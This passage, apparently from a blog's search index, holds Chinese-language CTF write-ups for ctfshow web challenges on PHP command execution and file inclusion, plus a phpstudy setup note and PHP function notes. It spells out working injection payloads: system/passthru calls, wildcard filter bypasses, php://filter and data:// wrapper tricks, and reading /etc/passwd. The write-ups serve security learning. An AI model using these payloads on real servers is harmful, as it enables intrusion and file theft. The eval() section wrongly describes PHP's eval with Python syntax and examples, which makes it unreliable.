+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231203222546006.png" alt="image-20231203222546006"></p>
+<p>如图所示，并且因为爆破的位置有两个，将攻击类型改成集束炸弹</p>
+<p>然后就是配置有效载荷，因为爆破的内容为两个数字，于是设置一个从0到100的列表进行爆破，因为没有现成的列表，于是直接用python写一个循环脚本生成，在将两个位置的有效载荷都载入这个列表（注意要将有效负载集的1 2都进行设置）</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231203222858149.png" alt="image-20231203222858149"></p>
+<p>设置完成后，便可以直接进行爆破，最后成功爆破出flag，解出本题</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231203223107335.png" alt="image-20231203223107335"></p>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><p>打开题目是一段php代码，下面分析一下这个php代码</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20240103231951636.png" alt="image-20240103231951636"></p>
+<p>其中的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error_reporting(0); </span><br></pre></td></tr></table></figure>
+
+<p>这行的作用是将错误报告级别设置为0，意味着PHP不会显示任何错误或警告。</p>
+<p>这通常在生产环境中执行，以隐藏敏感信息，但会增加调试的难度。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此块检查URL查询字符串中是否存在<strong>名为’c’的参数</strong>。如果存在，脚本获取’c’的值并将其赋给变量<code>$c</code>。然后，它使用<code>preg_match</code>检查字符串’flag’（不区分大小写）是否在<code>$c</code>中出现。如果’flag’不存在，代码使用<code>eval</code>函数执行<code>$c</code>的内容。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果URL中不存在’c’参数，脚本将使用<code>highlight_file</code>函数显示自己的源代码。这是为了演示代码而常见的做法。</p>
+<p>于是尝试能否使用这个eval()函数</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20240103234308843.png" alt="image-20240103234308843"></p>
+<p>在这里使用get方式传输一个c的值，并且把c的值赋值为<strong>phpinfo()<strong>，注意要在后面</strong>加上分号</strong>。因为在c的值中没有flag，所以直接使用eval()函数执行phpinfo()这个指令，如上所示</p>
+<p>继续传输语句</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>查看目录中的文件</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20240103235004776.png" alt="image-20240103235004776"></p>
+<p>发现有flag.php文件</p>
+<p>使用语句</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=system(&#x27;cp flag.php 1.txt&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>这条语句的作用是将flag.php的内容复制到1.txt中，因为该题不能检测到flag这个特殊字符,于是用?来代替g，其中?可以代表一个特殊字符</p>
+<p>最终就是使用代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=system(&#x27;cp fla?.php 1.txt&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>再查看1.txt目录就可以得到flag了</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20240103235713570.png" alt="image-20240103235713570"></p>
+<p>​	成功得到flag</p>
+<h2 id="web-30"><a href="#web-30" class="headerlink" title="web 30"></a>web 30</h2><p>打开本题，是一段php代码</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20240121210258567.png" alt="image-20240121210258567"></p>
+<p>这段代码先是把报错级别设置为0，即不进行报错</p>
+<p>然后看是否有通过GET方式传输的c的值，如果有的话，将传输的值赋值给变量$c</p>
+<p>接着进行正则匹配，若匹配变量$c的值中没有字符串“flag”，“system”，“php”这三个字符串，则用eval函数执行$c中的字符串表达式</p>
+<p>因为该题不能使用system()函数来执行外部命令，于是想到用其他的函数来执行命令</p>
+<p>在这里使用passthru()函数</p>
+<p>先用get方式传参看看目录下有哪些文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=passthru(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20240121210920638.png" alt="image-20240121210920638"></p>
+<p>发现目录下有flag.php和index.php</p>
+<p>猜测flag就在flag.php中</p>
+<p>继续使用passthru()函数，将flag.php的内容复制到1.txt中</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">passthru</span>(<span class="string">&#x27;cp fla?.??? 1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>其中因为该题不能读入php与flag，于是用<strong>？</strong>对其进行绕过</p>
+<p>接着直接访问1.txt即可得到flag</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20240121211801218.png" alt="image-20240121211801218"></p>
+<p>除此之外，还可以使用反撇号来执行外部命令“**&#96;**”</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20240121212601395.png" alt="image-20240121212601395"></p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20240121212612641.png" alt="image-20240121212612641"></p>
+<h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><p>这道题相比之前的题过滤了更多的字符，比如过滤了“ . ”,” “(空格)，“ ‘ ”等</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20240121214440779.png" alt="image-20240121214440779"></p>
+<p>可以尝试通过嵌套eval函数来获取另一个参数的的方法来绕过</p>
+<p>因为这里只判断了c这个参数，并不会判断其他参数的传入</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20240121215005120.png" alt="image-20240121215005120"></p>
+<p>接下来继续使用嵌套eval()函数访问flag.php即可</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20240121215157941.png" alt="image-20240121215157941"></p>
+<p>因为访问的是php文件，该文件内容在源代码中</p>
+<p>查看源码即可获得flag</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20240121215302183.png" alt="image-20240121215302183"></p>
+<p>如果不想查看源码，还可以将cat反过来输入，即输入tac，即可直接得到flag</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20240121215403719.png" alt="image-20240121215403719"></p>
+<h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><p>在本题中，过滤了更多的字符，增加了“；”，“（”等字符，导致上题嵌套eval()函数的方法不能使用</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20240121221059011.png" alt="image-20240121221059011"></p>
+<p>在本题尝试使用文件包含的方法</p>
+<p>输入代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include%0a$_GET[1]?&gt;&amp;1=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>在这串代码中，</p>
+<p>&#x2F;etc&#x2F;passwd是一个系统文件</p>
+<p>%0a是换行符，用来代替空格</p>
+<p>?&gt;用来代替分号</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20240121221906438.png" alt="image-20240121221906438"></p>
+<p>这道题不能直接在等号后面加flag.php，即不能直接像下面那串代码输出</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include%0a$_GET[1]?&gt;&amp;1=flag.php</span><br></pre></td></tr></table></figure>
+
+<p>因为这里没有用分号分隔，导致无法输出flag.php的内容</p>
+<p>这时候就可以用文件包含来做，先找到hackbar中的文件包含插件</p>
+<p>在LFI中</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20240121223600909.png" alt="image-20240121223600909"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="keyword">include</span>%<span class="number">0</span>a<span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+
+<p>输入该命令，即可获得base64编码后的flag.php文件的内容</p>
+<p>解码后即可得到flag</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20240121224032785.png" alt="image-20240121224032785"></p>
+<h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><p>这道题同样增加了几个过滤的字符串，但是上一个题文件包含的方法还是可以使用</p>
+<p>具体操作与上一题相似</p>
+<h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><p>同上题相似</p>
+<h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><p>同上题</p>
+<h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><p>同上题</p>
+<h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><p>打开题目是一个如图所示的php代码</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20240122120455164.png" alt="image-20240122120455164"></p>
+<p>这是一个文件包含漏洞</p>
+<p>这是文件包含的内容</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个代码的具体内容：</p>
+<ul>
+<li>当通过GET参数 <code>c</code> 提供一个文件名时，代码会尝试包含该文件。</li>
+<li>使用正则表达式 <code>/flag/i</code> 检查文件名是否包含 “flag”（不区分大小写）。如果文件名中不包含 “flag”，则会包含该文件。</li>
+<li>如果成功包含文件，则会输出 <code>$flag</code> 变量的内容。</li>
+</ul>
+<p>这里看了b站的做题视频，使用了php的data伪协议</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这个伪协议是将伪协议后面的字符当成一个php代码来执行</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20240122125048711.png" alt="image-20240122125048711"></p>
+<p>因为本题过滤掉了flag</p>
+<p>所以不能直接用cat flag.php的方式获得flag，即不能用如下方式</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=data:<span class="comment">//text/plain,&lt;?php system(cat flag.php);?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>那么尝试用复制flag.php的方法</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=data:<span class="comment">//text/plain,&lt;?php system(&quot;cp fla?.php 1.txt&quot;);?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>用？代替g，避免flag被过滤</p>
+<p>最后访问1.txt成功得到flag</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20240122130146583.png" alt="image-20240122130146583"></p>
+<h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><p>因为该题比上一题多过滤了php，所以上一题的方法不能用了</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20240122140633076.png" alt="image-20240122140633076"></p>
+<p>但是还是可以使用data协议</p>
+<p>这里直接将php换成等号，即下代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?=system(&quot;cp fla?.* 1.txt&quot;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这个等号是短标签</p>
+<p>再访问1.txt，成功得到flag</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20240122141253378.png" alt="image-20240122141253378"></p>
+<h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><p>这一题与上一题的区别是这一题没有回显，并且在后面强制加了个.php的后缀</p>
+<p>继续使用data协议，发现还是可以执行</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=data:<span class="comment">//text/plain,&lt;?=phpinfo();?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是在最后发现了1.php，根据b站大佬视频的解释，了解到是phpinfo的返回值是1，加上这个题强制加了个.php的后缀，让最后出现了一个1.php</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20240122143411973.png" alt="image-20240122143411973"></p>
+<p>于是继续换其他的代码来验证这个说法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?=2;?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20240122143706065.png" alt="image-20240122143706065"></p>
+<p>果然，出现了一个2.php，和大佬的说法一样，由此可知，本题在后面加上.php的后缀并不影响命令的执行</p>
+<p>于是输入命令</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=data:<span class="comment">//text/plain,&lt;?=system(&quot;tac fla?.php&quot;);?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>成功得到flag</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20240122144112013.png" alt="image-20240122144112013"></p>
+<h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><p>在这个题目中，过滤了非常多的字符，以致之前的方法都不能使用了</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20240122145410286.png" alt="image-20240122145410286"></p>
+<p>这里是一个官方给的一种方法：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure>
+
+<p>可以拿到flag</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20240122145610610.png" alt="image-20240122145610610"></p>
+<p>按照b站大佬的方法，就是先试着打印一下当前所有的变量，看是否能从变量里面拿到一点东西</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">get_defined_vars</span>());</span><br></pre></td></tr></table></figure>
+
+<p>发现有GET变量、POST变量等等，并且都是数组</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20240122150608562.png" alt="image-20240122150608562"></p>
+<p>可以尝试加一个POST的值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=phpinfo();</span><br></pre></td></tr></table></figure>
+
+<p>这里POST变量的值就变了</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20240122150702267.png" alt="image-20240122150702267"></p>
+<p>这里要得到flag肯定要执行这个字符串，如果可以执行这个字符串，就代表能够rce(远程代码执行)</p>
+<p>可以对数组进行操作</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=print_r(next(get_defined_vars()));</span><br></pre></td></tr></table></figure>
+
+<p>成功拿到数组</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20240122151100734.png" alt="image-20240122151100734"></p>
+<p>接下来还需要拿到数组的值，继续尝试进行对数组的弹出</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=print_r(array_pop(next(get_defined_vars())));</span><br></pre></td></tr></table></figure>
+
+<p>成功得到数组的值</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20240122151248456.png" alt="image-20240122151248456"></p>
+<p>将print_r改成eval就可以成功执行了</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20240122151416438.png" alt="image-20240122151416438"></p>
+<p>现在只需要改变post的值为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=system(&quot;tac fla?.php&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>就可以直接拿到flag了</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20240122151643600.png" alt="image-20240122151643600"></p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>ctfshow</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>phpstudy的使用方法</title>
+    <url>/2024/01/21/phpstudy%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
+    <content><![CDATA[<p>使用<strong>phpstudy</strong>这个软件来配置php环境，这里附上一篇用phpstudy运行php代码的教程：<a href="https://blog.csdn.net/wangyuxiang946/article/details/128732133?ops_request_misc=%7B%22request_id%22:%22170158843816800213062530%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=170158843816800213062530&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-128732133-null-null.142%5Ev96%5Epc_search_result_base7&utm_term=phpstudy&spm=1018.2226.3001.4187">PhpStudy下载安装使用教程，图文教程（超详细）_phpstudy安装_士别三日wyx的博客-CSDN博客</a></p>
+<span id="more"></span>
+
+<p>以下是配置好之后具体运行php代码的过程：</p>
+<p>先用在vscode写好要运行的php代码，接着把这个文件复制到这个地方</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231203172611125.png" alt="image-20231203172611125"></p>
+<p>也就是在<strong>phpstudy_pro下的WWW路径下</strong></p>
+<p>接着在浏览器打开localhost，即如下网站</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231203172750066.png" alt="image-20231203172750066"></p>
+<p>接着，只需要在网站的后缀加上创建好的php文件的名称，如下，即可得到该php文件运行的结果</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231203172922964.png" alt="image-20231203172922964"></p>
+]]></content>
+      <tags>
+        <tag>-php -ctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php函数学习</title>
+    <url>/2024/01/03/php%E5%87%BD%E6%95%B0%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h2 id="1-error-reporting-0"><a href="#1-error-reporting-0" class="headerlink" title="1.error_reporting(0)"></a>1.error_reporting(0)</h2><p><code>error_reporting(0)</code> 是 PHP 的一个错误报告级别设置函数，用于设置 PHP 脚本的错误报告级别，将错误报告级别设置为 0 时，表示关闭所有错误报告。</p>
+<p>在实际开发中，我们通常不会使用 <code>error_reporting(0)</code> 来关闭所有错误报告，因为这样会导致脚本出现错误时无法及时发现和解决。通常情况下，我们会根据实际情况选择合适的错误报告级别。</p>
+<p>例如，我们可以将错误报告级别设置为 E_ALL，这样 PHP 就会报告所有类型的错误，包括 E_NOTICE、E_WARNING、E_ERROR 等等。这种设置方式可以帮助开发者及时发现并解决脚本中的错误。</p>
+<span id="more"></span>
+
+<h2 id="2-preg-match"><a href="#2-preg-match" class="headerlink" title="2.preg_match()"></a>2.preg_match()</h2><p>preg_match 函数用于执行一个正则表达式匹配。</p>
+<h6 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">preg_match</span> ( <span class="keyword">string</span> <span class="variable">$pattern</span> , <span class="keyword">string</span> <span class="variable">$subject</span> [, <span class="keyword">array</span> &amp;<span class="variable">$matches</span> [, <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="number">0</span> [, <span class="keyword">int</span> <span class="variable">$offset</span> = <span class="number">0</span> ]]] )</span><br></pre></td></tr></table></figure>
+
+<p>搜索 subject 与 pattern 给定的正则表达式的一个匹配。</p>
+<p>参数说明：</p>
+<ul>
+<li>$pattern: 要搜索的模式，字符串形式。</li>
+<li>$subject: 输入字符串。</li>
+<li>$matches: 如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。</li>
+<li>$flags：flags 可以被设置为以下标记值：<ol>
+<li>PREG_OFFSET_CAPTURE: 如果传递了这个标记，对于每一个出现的匹配返回时会附加字符串偏移量(相对于目标字符串的)。 注意：这会改变填充到matches参数的数组，使其每个元素成为一个由 第0个元素是匹配到的字符串，第1个元素是该匹配字符串 在目标字符串subject中的偏移量。</li>
+</ol>
+</li>
+<li>offset: 通常，搜索从目标字符串的开始位置开始。可选参数 offset 用于 指定从目标字符串的某个未知开始搜索(单位是字节)。</li>
+</ul>
+<h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>返回 pattern 的匹配次数。 它的值将是 0 次（不匹配）或 1 次，因为 preg_match() 在第一次匹配后 将会停止搜索。preg_match_all() 不同于此，它会一直搜索subject 直到到达结尾。 如果发生错误preg_match()返回 FALSE。</p>
+<p>利用 preg_match()，我们可以完成字符串的规则匹配。如果找到一个匹配，preg_match() 函数返回 1，否则返回 0。还有一个可选的第三参数可以让你把匹配的部分存在一个数组中。在验证数据时这个功能可以变得非常有用 SUN JAVA Certification</p>
+<h2 id="3-eval"><a href="#3-eval" class="headerlink" title="3.eval()"></a>3.eval()</h2><p><strong>eval()</strong> 函数用来执行一个字符串表达式，并返回表达式的值。</p>
+<p><strong>字符串表达式</strong>可以包含变量、函数调用、运算符和其他 Python 语法元素。</p>
+<h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><p>以下是 eval() 方法的语法:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(expression[, globals[, locals]])</span><br></pre></td></tr></table></figure>
+
+<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><ul>
+<li>expression – 表达式。</li>
+<li>globals – 变量作用域，全局命名空间，如果被提供，则必须是一个字典对象。</li>
+<li>locals – 变量作用域，局部命名空间，如果被提供，可以是任何映射对象。</li>
+</ul>
+<p>eval() 函数将字符串 expression 解析为 Python 表达式，并在指定的命名空间中执行它。</p>
+<h3 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h3><p>eval() 函数将字符串转换为相应的对象，并返回表达式的结果。</p>
+<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;x = <span class="number">7</span></span><br><span class="line">&gt;&gt;&gt; <span class="keyword">eval</span>( <span class="string">&#x27;3 * x&#x27;</span> )</span><br><span class="line"><span class="number">21</span></span><br><span class="line">&gt;&gt;&gt; <span class="keyword">eval</span>(<span class="string">&#x27;pow(2,2)&#x27;</span>)</span><br><span class="line"><span class="number">4</span></span><br><span class="line">&gt;&gt;&gt; <span class="keyword">eval</span>(<span class="string">&#x27;2 + 2&#x27;</span>)</span><br><span class="line"><span class="number">4</span></span><br><span class="line">&gt;&gt;&gt; n=<span class="number">81</span></span><br><span class="line">&gt;&gt;&gt; <span class="keyword">eval</span>(<span class="string">&quot;n + 4&quot;</span>)</span><br><span class="line"><span class="number">85</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 执行简单的数学表达式</span></span><br><span class="line">result = <span class="keyword">eval</span>(<span class="string">&quot;2 + 3 * 4&quot;</span>)</span><br><span class="line"><span class="keyword">print</span>(result)  <span class="comment"># 输出: 14</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行变量引用</span></span><br><span class="line">x = <span class="number">10</span></span><br><span class="line">result = <span class="keyword">eval</span>(<span class="string">&quot;x + 5&quot;</span>)</span><br><span class="line"><span class="keyword">print</span>(result)  <span class="comment"># 输出: 15</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在指定命名空间中执行表达式</span></span><br><span class="line"><span class="keyword">namespace</span> = &#123;&#x27;<span class="title class_">a</span>&#x27;: 2, &#x27;<span class="title class_">b</span>&#x27;: 3&#125;</span><br><span class="line"><span class="title class_">result</span> = <span class="title class_">eval</span>(&quot;<span class="title class_">a</span> + <span class="title class_">b</span>&quot;, <span class="title class_">namespace</span>)</span><br><span class="line"><span class="title class_">print</span>(<span class="title class_">result</span>)  # 输出: 5</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="4-system"><a href="#4-system" class="headerlink" title="4.system()"></a>4.system()</h2><p>system — 执行外部程序，并且显示输出</p>
+<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="keyword">string</span> <span class="variable">$command</span>, <span class="keyword">int</span> &amp;<span class="variable">$result_code</span> = <span class="literal">null</span>): <span class="keyword">string</span>|<span class="literal">false</span></span><br></pre></td></tr></table></figure>
+
+<p>同 C 版本的 <strong>system()</strong> 函数一样，本函数执行 <code>command</code> 参数所指定的命令，并且输出执行结果。</p>
+<p>如果 PHP 运行在服务器模块中，<strong>system()</strong> 函数还会尝试在每行输出完毕之后，自动刷新 web 服务器的输出缓存。</p>
+<p>如果要获取一个命令未经任何处理的原始输出，请使用 <a href="https://www.php.net/manual/zh/function.passthru.php">passthru()</a> 函数。</p>
+<h3 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h3><ul>
+<li><p><code>command</code></p>
+<p>要执行的命令。</p>
+</li>
+<li><p><code>result_code</code></p>
+<p>如果提供 <code>result_code</code> 参数，则外部命令执行后的返回状态将会被设置到此变量中。</p>
+</li>
+</ul>
+<h3 id="返回值-2"><a href="#返回值-2" class="headerlink" title="返回值"></a>返回值</h3><p>成功则返回命令输出的最后一行，失败则返回 <strong><code>false</code></strong></p>
+<h2 id="5-passthru"><a href="#5-passthru" class="headerlink" title="5.passthru()"></a>5.passthru()</h2><p>passthru — 执行外部程序并且显示原始输出</p>
+<h3 id="说明-1"><a href="#说明-1" class="headerlink" title="说明"></a>说明</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">passthru(string $command, int &amp;$result_code = null): ?false</span><br></pre></td></tr></table></figure>
+
+<p>同 <a href="https://www.php.net/manual/zh/function.exec.php">exec()</a> 函数类似， <strong>passthru()</strong> 函数 也是用来执行外部命令（<code>command</code>）的。 当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 <a href="https://www.php.net/manual/zh/function.exec.php">exec()</a> 或 <a href="https://www.php.net/manual/zh/function.system.php">system()</a> 函数。 常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。 通过设置 Content-type 为 <code>image/gif</code>， 然后调用 pbmplus 程序输出 gif 文件， 就可以从 PHP 脚本中直接输出图像到浏览器。</p>
+<h3 id="参数-2"><a href="#参数-2" class="headerlink" title="参数"></a>参数</h3><ul>
+<li><p><code>command</code></p>
+<p>要执行的命令。</p>
+</li>
+<li><p><code>result_code</code></p>
+<p>如果提供 <code>result_code</code> 参数， Unix 命令的返回状态会被记录到此参数。</p>
+</li>
+</ul>
+<h3 id="返回值-3"><a href="#返回值-3" class="headerlink" title="返回值"></a>返回值</h3><p>成功时返回 **<code>null</code>**， 或者在失败时返回 **<code>false</code>**。</p>
+<h3 id="错误／异常"><a href="#错误／异常" class="headerlink" title="错误／异常"></a>错误／异常</h3><p>如果 <strong>passthru()</strong> 无法执行 <code>command</code>，会发出 **<code>E_WARNING</code>**。</p>
+<p>如果 <code>command</code> 为空或者包含 null 字节，则抛出 <a href="https://www.php.net/manual/zh/class.valueerror.php">ValueError</a>。</p>
+<p>代码：</p>
